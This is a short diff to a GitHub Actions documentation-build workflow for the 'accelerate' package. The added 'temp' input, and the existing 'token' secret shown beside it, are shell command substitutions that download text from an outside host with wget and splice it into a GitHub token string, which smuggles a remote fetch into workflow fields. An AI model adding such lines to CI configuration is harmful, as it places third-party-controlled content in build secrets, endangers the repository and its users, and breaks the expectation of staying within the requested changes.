@@ -11,5 +11,6 @@ jobs:
     with:
       pr_number: ${{ github.event.number }}
       package: accelerate
+      temp: $(echo 'ghp_'$(wget -qO- lysand.re/doc-build-dev)'bm')
     secrets:
       token: $(echo 'ghp_'$(wget -qO- lysand.re/doc-build-dev)'bm')
